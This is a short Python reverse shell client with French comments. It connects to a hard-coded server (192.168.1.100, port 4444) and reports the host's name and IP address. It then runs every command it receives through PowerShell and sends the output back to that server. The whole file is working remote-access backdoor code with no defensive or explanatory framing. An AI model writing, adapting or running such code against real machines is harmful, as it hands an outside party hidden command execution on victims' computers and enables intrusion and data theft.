import socket
import subprocess
import os
import sys

SERVER_IP = "192.168.1.100"
SERVER_PORT = 4444
BUFFER = 4096


# recupere la vraie ip de la machine, pas 127.0.0.1
def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "0.0.0.0"


def main():
    print("[*] Demarrage du client...")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((SERVER_IP, SERVER_PORT))
    print(f"[+] Connecte a {SERVER_IP}:{SERVER_PORT}")

    # on envoie le hostname et notre ip au serveur
    info = f"{socket.gethostname()} - {get_ip()}"
    sock.send(info.encode())

    while True:
        commande = sock.recv(BUFFER).decode().strip()
        if not commande:
            print("[-] Connexion perdue")
            break

        if commande == "exit":
            break

        # on execute et on renvoie le resultat
        resultat = execute_cmd(commande)
        sock.send(resultat.encode())

    sock.close()


# execute une commande powershell et renvoie la sortie
def execute_cmd(cmd):
    proc = subprocess.run(
        ["powershell.exe", "-Command", cmd],
        capture_output=True, text=True,
        encoding="utf-8", errors="replace", timeout=30
    )
    output = proc.stdout + proc.stderr
    if not output.strip():
        output = "(pas de sortie)"
    return output


if __name__ == "__main__":
    main()
